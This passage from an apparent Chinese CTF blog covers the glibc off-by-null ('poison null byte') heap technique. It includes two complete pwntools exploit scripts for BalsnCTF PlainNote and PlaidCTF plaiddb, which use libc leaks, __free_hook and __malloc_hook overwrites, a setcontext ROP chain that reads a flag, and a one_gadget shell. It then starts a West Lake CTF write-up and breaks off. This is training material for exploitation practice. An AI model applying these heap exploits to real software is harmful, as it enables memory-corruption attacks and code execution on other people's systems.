class="hljs-number">0x80</span>);<br><br><span class="hljs-built_in">memset</span>(prev2, <span class="hljs-string">&#x27;C&#x27;</span>, <span class="hljs-number">0x80</span>);<br><br>assert(<span class="hljs-built_in">strstr</span>(merged, <span class="hljs-string">&quot;CCCCCCCCC&quot;</span>));<br>&#125;<br></code></pre></td></tr></table></figure>为了绕开新加的presize的检查，我们就要保证off by null的时候只覆盖preinuse位，即size要保证0x100对齐且不存在chunk堆块的错位。那么下一步我们就需要绕开unlink对于chunk前后连接的的检查    </li><li>我们要布置的连接在unsorted bin中的fake chunk就是prev+0x10，那么prev的fd_nextsize和bk_nextsize就是fake chunk的fd和bk。需要fd_nextsize和bk_nextsize有效就得将prev放进large bin<img src="/2023/02/04/poison-null-byte/1-1.jpg" class title="步骤一"></li><li>以上步骤完成后fake chunk的fd和bk布置完毕，接下来就是通过large bin将chunk地址写入a和b，由于我们之前已经保证了prev的地址对齐0x1000，因此申请回a和b再覆盖两字节就能完成fake chunk的连接<img src="/2023/02/04/poison-null-byte/1-2.jpg" class title="步骤二"><img src="/2023/02/04/poison-null-byte/1-3.jpg" class title="步骤三"></li><li>off by null触发victim的向下合并，这时我们可以通过prev2控制victim2的头部<img src="/2023/02/04/poison-null-byte/1-4.jpg" class title="步骤四"></li></ul><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="BalsnCTF-2019-PlainNote（2-29）"><a href="#BalsnCTF-2019-PlainNote（2-29）" class="headerlink" title="BalsnCTF 2019-PlainNote（2.29）"></a>BalsnCTF 2019-PlainNote（2.29）</h2><p>高版本的off by null，做的是真坐牢，但收获也不少。没找到2.29的libc所以用的2.31</p><h3 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h3><p>逆向不难，需要注意的就是add函数中存在off by null漏洞，会在输入最后加一个空字符，在存在漏洞的同时也使泄露地址变得困难</p><img src="/2023/02/04/poison-null-byte/add.png" class title="add"><p>以及本题存在沙箱，需要用orw读取flag</p><p>沙箱是白名单形式的，只允许read、write、open和exit的系统调用，程序中所有的输入输出都是通过read和write实现的</p><img src="/2023/02/04/poison-null-byte/myputs.png" class title="myputs"><img src="/2023/02/04/poison-null-byte/myprintf.png" class title="myprintf"><img src="/2023/02/04/poison-null-byte/readint.png" class title="readint"><p>输出会用strlen取输出的字节数，而strlen是通过空字符确定长度的，所以不可能通过连带的方式泄露地址</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>主要流程有四步：</p><ul><li>泄露libc基址</li><li>泄露heap地址</li><li>执行off by null</li><li>进行orw<br>执行off by null按照实验代码执行就行，orw用gadget+setcontext模板就行，主要难点在于泄露地址，所以off by null的步骤得进行一定的改进<br>由于堆的基址会保持页对齐即0x1000对齐，但进行b’\x00\x10’覆盖时会把第四位也覆盖为0，所以只有当我们的prev chunk的地址的第四位为0时才能覆盖成功，也就是说在开启aslr的情况下存在一个1&#x2F;16的爆破（本地做的时候可以先关闭aslr）</li><li>由于init函数会使heap非常的混乱所以可以先把bin清空<img src="/2023/02/04/poison-null-byte/init.png" class title="init"></li><li>首先在最开始堆布局的时候prev上再加两个0x20的chunk，这样off by null之后的堆布局如下所示：<img src="/2023/02/04/poison-null-byte/2-1.jpg" class title="步骤一">其中prev3用于off by null更改victim的presize和preinuse，prev2用于泄露</li><li>在off by null结束之后申请一个0x4f0的chunk，这样我们就能通过prev2利用show函数打印fd指针<br>由于我们需要泄露libc基址和heap两个地址，所以我们要先申请回0x530的chunk，然后释放一个unsorted bin范围的chunk（pad），再释放0x530的chunk，这样prev2的fd指向一个heap地址pad，再申请回pad，prev2的fd就指向unsorted bin<img src="/2023/02/04/poison-null-byte/2-2.jpg" class title="步骤二"></li><li>然后我们可可以从prev2中再切下来一个tcache范围内的chunk，通过打tcache执行orw</li><li>orw时需要注意一点，直接执行open函数时实际调用的syscall是0x101，会被沙箱ban掉<img src="/2023/02/04/poison-null-byte/open.png" class title="open">所以要通过rax进行syscall，这里选用的是time函数和timelocal函数中间的sub_D3F40<img src="/2023/02/04/poison-null-byte/syscall.png" class title="syscall"></li></ul><h3 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os = <span class="hljs-string">&#x27;linux&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>    p.sendafter(<span class="hljs-string">b&#x27;Choice: &#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">b&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Content: &#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">remove</span>(<span class="hljs-params">index</span>):<br>    p.sendafter(<span class="hljs-string">b&#x27;Choice: &#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">b&#x27;Idx: &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.sendafter(<span class="hljs-string">b&#x27;Choice: &#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">b&#x27;Idx: &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br><br>p=process(<span class="hljs-string">&#x27;./note&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<span class="hljs-comment">#0-15</span><br>    add(<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<span class="hljs-comment">#16-31</span><br>    add(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<span class="hljs-comment">#32-40</span><br>    add(<span class="hljs-number">0x70</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<span class="hljs-comment">#41-45</span><br>    add(<span class="hljs-number">0xc0</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>):<span class="hljs-comment">#46-47</span><br>    add(<span class="hljs-number">0xe0</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>)<br>add(<span class="hljs-number">0xcf0</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>)<span class="hljs-comment">#48</span><br>add(<span class="hljs-number">0x500</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>)<span class="hljs-comment">#prev_1(49)</span><br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>)<span class="hljs-comment">#prev_2(50)</span><br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>)<span class="hljs-comment">#prev_3(51)</span><br>add(<span class="hljs-number">0x4f0</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>)<span class="hljs-comment">#victim(52)</span><br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>)<span class="hljs-comment">#padding(53)</span><br>add(<span class="hljs-number">0x4f0</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>)<span class="hljs-comment">#a(54)</span><br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>)<span class="hljs-comment">#padding(55)</span><br>add(<span class="hljs-number">0x510</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>)<span class="hljs-comment">#b(56)</span><br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>)<span class="hljs-comment">#padding(57)</span><br>remove(<span class="hljs-number">49</span>)<br>remove(<span class="hljs-number">54</span>)<br>remove(<span class="hljs-number">56</span>)<br>add(<span class="hljs-number">0x1000</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>)<span class="hljs-comment">#49</span><br>add(<span class="hljs-number">0x1000</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>)<span class="hljs-comment">#padding(58)</span><br>add(<span class="hljs-number">0x500</span>,p64(<span class="hljs-number">0</span>)+<span class="hljs-string">b&#x27;\x41\x05\x00\x00\x00\x00\x00&#x27;</span>)<span class="hljs-comment">#prev1_1(54)</span><br>add(<span class="hljs-number">0x510</span>,<span class="hljs-string">b&#x27;\x10&#x27;</span>)<span class="hljs-comment">#b2(56)</span><br>add(<span class="hljs-number">0x4f0</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>)<span class="hljs-comment">#a2(59)</span><br>remove(<span class="hljs-number">59</span>)<br>remove(<span class="hljs-number">52</span>)<br>add(<span class="hljs-number">0x4f0</span>,p64(<span class="hljs-number">0</span>)+<span class="hljs-string">b&#x27;\x10&#x27;</span>)<span class="hljs-comment">#a3(52)</span><br>add(<span class="hljs-number">0x4f0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<span class="hljs-comment">#victim2(59)</span><br>remove(<span class="hljs-number">51</span>)<br>add(<span class="hljs-number">0x18</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0x540</span>))<span class="hljs-comment">#prev1_2(51)</span><br>gdb.attach(p)<br>remove(<span class="hljs-number">59</span>)<br>add(<span class="hljs-number">0x4f0</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>)<span class="hljs-comment">#prev1_1(59)</span><br>add(<span class="hljs-number">0x530</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>)<span class="hljs-comment">#60</span><br>remove(<span class="hljs-number">49</span>)<br>remove(<span class="hljs-number">60</span>)<br>show(<span class="hljs-number">50</span>)<br>s=p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>heap=u64(s)-<span class="hljs-number">0x14d0</span>+<span class="hljs-number">0xa80</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;heap:&quot;</span>,<span class="hljs-built_in">hex</span>(heap))<br>add(<span class="hljs-number">0x1000</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>)<br>show(<span class="hljs-number">50</span>)<br>s=p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>libcbase=u64(s)-libc.symbols[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]-<span class="hljs-number">0x10</span>-<span class="hljs-number">96</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;libcbase:&quot;</span>,<span class="hljs-built_in">hex</span>(libcbase))<br>add(<span class="hljs-number">0x530</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0x20</span>))<span class="hljs-comment">#60</span><br>remove(<span class="hljs-number">53</span>)<br>remove(<span class="hljs-number">51</span>)<br>free_hook=libcbase+libc.symbols[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>remove(<span class="hljs-number">60</span>)<br>add(<span class="hljs-number">0x530</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0x20</span>)+p64(free_hook))<br>remove(<span class="hljs-number">52</span>)<span class="hljs-comment">#a3(orw)</span><br>gadget=libcbase+<span class="hljs-number">0x1547a0</span><br>setcontext_addr=libcbase+<span class="hljs-number">0x580dd</span><br>ret_addr=libcbase+<span class="hljs-number">0x25679</span><br>write_addr=libcbase+libc.symbols[<span class="hljs-string">&#x27;write&#x27;</span>]<br>open_addr=libcbase+libc.symbols[<span class="hljs-string">&#x27;open&#x27;</span>]<br>read_addr=libcbase+libc.symbols[<span class="hljs-string">&#x27;read&#x27;</span>]<br>pop_rdi_addr=libcbase+<span class="hljs-number">0x26b72</span><br>pop_rsi_addr=libcbase+<span class="hljs-number">0x27529</span><br>pop_rdx_r12_addr=libcbase+<span class="hljs-number">0x11c1e1</span><br>pop_rax_addr=libcbase+<span class="hljs-number">0x4a550</span><br>syscall_addr=libcbase+<span class="hljs-number">0xd3f49</span><br>payload=<span class="hljs-string">b&#x27;./flag\x00\x00&#x27;</span>+p64(heap)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(setcontext_addr)+<span class="hljs-string">b&#x27;\x00&#x27;</span>*(<span class="hljs-number">0xa0</span>-<span class="hljs-number">0x28</span>)+p64(heap+<span class="hljs-number">0x100</span>)+p64(ret_addr)+<span class="hljs-string">b&#x27;\x00&#x27;</span>*(<span class="hljs-number">0x100</span>-<span class="hljs-number">0xb0</span>)<br>payload+=p64(pop_rdi_addr)+p64(heap)+p64(pop_rsi_addr)+p64(<span class="hljs-number">0</span>)+p64(pop_rax_addr)+p64(<span class="hljs-number">2</span>)+p64(syscall_addr)<br>payload+=p64(pop_rdi_addr)+p64(<span class="hljs-number">3</span>)+p64(pop_rsi_addr)+p64(heap+<span class="hljs-number">0x300</span>)+p64(pop_rdx_r12_addr)+p64(<span class="hljs-number">0x50</span>)+p64(<span class="hljs-number">0</span>)+p64(read_addr)<br>payload+=p64(pop_rdi_addr)+p64(<span class="hljs-number">1</span>)+p64(pop_rsi_addr)+p64(heap+<span class="hljs-number">0x300</span>)+p64(pop_rdx_r12_addr)+p64(<span class="hljs-number">0x50</span>)+p64(<span class="hljs-number">0</span>)+p64(write_addr)<br>add(<span class="hljs-number">0x4f0</span>,payload)<br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>)<br>add(<span class="hljs-number">0x10</span>,p64(gadget))<br><span class="hljs-comment">#gdb.attach(p)</span><br>remove(<span class="hljs-number">52</span>)<br><span class="hljs-built_in">print</span>(p.recv())<br><span class="hljs-comment">#gdb.attach(p)</span><br>pause()<br></code></pre></td></tr></table></figure><h2 id="PlaidCTF-2015-plaiddb（2-19）"><a href="#PlaidCTF-2015-plaiddb（2-19）" class="headerlink" title="PlaidCTF 2015-plaiddb（2.19）"></a>PlaidCTF 2015-plaiddb（2.19）</h2><p>低版本的off by null，忘记了有个东西叫二叉树是我的错(<em>^_^</em>)，由于是2015年的题所以2.19的libc多少有点离谱了，用的2.23的libc</p><h3 id="逆向-1"><a href="#逆向-1" class="headerlink" title="逆向"></a>逆向</h3><p>在不需要理会平衡树的具体算法的情况下只需要注意一点，读入key的sub_1040函数中存在off by null漏洞</p><img src="/2023/02/04/poison-null-byte/get_key.png" class title="get_key"><p>realloc的大致逻辑是如果堆块能够向上拓展的话就向上拓展，如果不能，就重新分配堆块</p><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>由于程序会申请一些0x20和0x40的堆块作为key和chunk，这样会使heap结构变得复杂，所以可以先申请一些备用</p><img src="/2023/02/04/poison-null-byte/small_chunk.png" class title="small_chunk"><p>这样我们进行利用的就只是用于data的堆块了，由于data的大小是可控的所以这样利用起来更加方便</p><img src="/2023/02/04/poison-null-byte/heap.png" class title="heap"><p>由于要利用key的off by null，所以可以先释放一个data再占用这个地址的chunk作为key<br>其余步骤和上一题类似，申请六个堆块，靠近top chunk的chunk用于防合并，首尾两个chunk用于触发unsorted bin向下合并，中间0x70的chunk用于fastbin attack，剩下两个chunk一个用于泄露libc，一个用于off by null<br>ps：one_gadget都不可用，需要用realloc调整栈内容</p><h3 id="Exp-1"><a href="#Exp-1" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">put</span>(<span class="hljs-params">key,size,data</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;PROMPT: Enter command:\n&#x27;</span>,<span class="hljs-string">b&#x27;PUT&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;PROMPT: Enter row key:\n&#x27;</span>,key)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;PROMPT: Enter data size:\n&#x27;</span>,<span class="hljs-built_in">str</span>(size).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;PROMPT: Enter data:\n&#x27;</span>,data)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get</span>(<span class="hljs-params">key</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;PROMPT: Enter command:\n&#x27;</span>,<span class="hljs-string">b&#x27;GET&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;PROMPT: Enter row key:\n&#x27;</span>,key)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dump</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;PROMPT: Enter command:\n&#x27;</span>,<span class="hljs-string">b&#x27;DUMP&#x27;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">key</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;PROMPT: Enter command:\n&#x27;</span>,<span class="hljs-string">b&#x27;DEL&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;PROMPT: Enter row key:\n&#x27;</span>,key)<br><br>p=process(<span class="hljs-string">&#x27;./datastore.elf&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc-2.23.so&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>):<br>    put(<span class="hljs-built_in">str</span>(i),<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;0&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>):<br>    delete(<span class="hljs-built_in">str</span>(i))<br>put(<span class="hljs-string">b&#x27;1&#x27;</span>,<span class="hljs-number">0xf0</span>,<span class="hljs-string">b&#x27;1&#x27;</span>*<span class="hljs-number">0xf0</span>)<span class="hljs-comment">#unsorted bin</span><br>put(<span class="hljs-string">b&#x27;2&#x27;</span>,<span class="hljs-number">0xf0</span>,<span class="hljs-string">b&#x27;2&#x27;</span>*<span class="hljs-number">0xf0</span>)<span class="hljs-comment">#leak</span><br>put(<span class="hljs-string">b&#x27;3&#x27;</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;3&#x27;</span>*<span class="hljs-number">0x60</span>)<span class="hljs-comment">#fastbin attack</span><br>put(<span class="hljs-string">b&#x27;4&#x27;</span>,<span class="hljs-number">0xf0</span>,<span class="hljs-string">b&#x27;4&#x27;</span>*<span class="hljs-number">0xf0</span>)<span class="hljs-comment">#off by null</span><br>put(<span class="hljs-string">b&#x27;5&#x27;</span>,<span class="hljs-number">0xf0</span>,<span class="hljs-string">b&#x27;5&#x27;</span>*<span class="hljs-number">0xf0</span>)<span class="hljs-comment">#unsorted bin</span><br>put(<span class="hljs-string">b&#x27;6&#x27;</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;6&#x27;</span>*<span class="hljs-number">0x60</span>)<span class="hljs-comment">#barrier</span><br>gdb.attach(p)<br>delete(<span class="hljs-string">b&#x27;4&#x27;</span>)<br>put(<span class="hljs-string">b&#x27;7&#x27;</span>*<span class="hljs-number">0xf0</span>+p64(<span class="hljs-number">0x370</span>),<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;7&#x27;</span>)<br>delete(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>delete(<span class="hljs-string">b&#x27;5&#x27;</span>)<br>put(<span class="hljs-string">b&#x27;8&#x27;</span>,<span class="hljs-number">0xf0</span>,<span class="hljs-string">b&#x27;8&#x27;</span>*<span class="hljs-number">0xf0</span>)<br>get(<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>s=p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>libcbase=u64(s)-<span class="hljs-number">0x68</span>-libc.symbols[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br>delete(<span class="hljs-string">b&#x27;3&#x27;</span>)<br>put(<span class="hljs-string">b&#x27;9&#x27;</span>,<span class="hljs-number">0x160</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>*<span class="hljs-number">0xf0</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x70</span>)+p64(libcbase+libc.symbols[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]-<span class="hljs-number">0x23</span>)+p64(<span class="hljs-number">0</span>)+<span class="hljs-string">b&#x27;Q&#x27;</span>*<span class="hljs-number">0x50</span>)<br>put(<span class="hljs-string">b&#x27;10&#x27;</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>*<span class="hljs-number">0x60</span>)<br>put(<span class="hljs-string">b&#x27;11&#x27;</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>*(<span class="hljs-number">0x13</span>-<span class="hljs-number">8</span>)+p64(libcbase+<span class="hljs-number">0xf0897</span>)+p64(libcbase+libc.symbols[<span class="hljs-string">&#x27;realloc&#x27;</span>])+<span class="hljs-string">b&#x27;\x00&#x27;</span>*(<span class="hljs-number">0x60</span>-<span class="hljs-number">0x13</span>-<span class="hljs-number">8</span>))<br><span class="hljs-comment">#gdb.attach(p)</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;PROMPT: Enter command:\n&#x27;</span>,<span class="hljs-string">b&#x27;PUT&#x27;</span>)<br><span class="hljs-comment">#put(b&#x27;12&#x27;,1,b&#x27;a&#x27;)</span><br>p.interactive()<br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Pwn</category>
      
      <category>Heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>how2heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023 西湖论剑初赛 pwn wp</title>
    <link href="/2023/02/03/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%88%9D%E8%B5%9Bpwn-wp/"/>
    <url>/2023/02/03/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%88%9D%E8%B5%9Bpwn-wp/</url>
    
    <content type="html"><![CDATA[<p>感想：虽然在电脑前坐了八小时才写出来一道题而且从中午开始头疼止痛药还在阳的时候吃完了导致晚上头疼失眠还没吃午饭但出flag的时候感觉值了！！！<br>真正的感想：好坐牢好坐牢但终于没有爆零了啊哈哈哈哈哈哈我不是fw我好快乐哈哈哈哈哈哈哈（一些发疯文学）</p><span id="more"></span><h1 id="babycalc"><a href="#babycalc" class="headerlink" title="babycalc"></a>babycalc</h1><p>你懂8小时一道题的含金量~o( &#x3D;∩ω∩&#x3D; )m</p><h2 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h2><img src="/2023/02/03/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%88%9D%E8%B5%9Bpwn-wp/main.png" class title="main"><p>main函数，init_设置缓冲区，output输出一些东西，真正的主函数是cal</p><img src="/2023/02/03/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%88%9D%E8%B5%9Bpwn-wp/cal.png" class title="cal"><p>后半段首先看到一堆数值判断，z3解个方程</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br>v3,v4,v5,v6,v7,v8,v9,v10,v11,v12,v13,v14,v15,v16,v17,v18=Ints(<span class="hljs-string">&#x27;v3 v4 v5 v6 v7 v8 v9 v10 v11 v12 v13 v14 v15 v16 v17 v18&#x27;</span>)<br>solver = Solver()<br>solver.add(v5 * v4 * v3 - v6 == <span class="hljs-number">0x8D56</span>)<br>solver.add(v3 == <span class="hljs-number">0x13</span>)<br>solver.add(v5 * <span class="hljs-number">0x13</span> * v4 + v6 == <span class="hljs-number">0x8DE2</span>)<br>solver.add((v13 + v3 - v8) * v16 == <span class="hljs-number">0x8043</span>)<br>solver.add((v5 + v4 * v3) * v6 == <span class="hljs-number">0xC986</span>)<br>solver.add(v9 * v8 * v7 - v10 == <span class="hljs-number">0xF06D</span>)<br>solver.add(v10 * v15 + v4 + v18 == <span 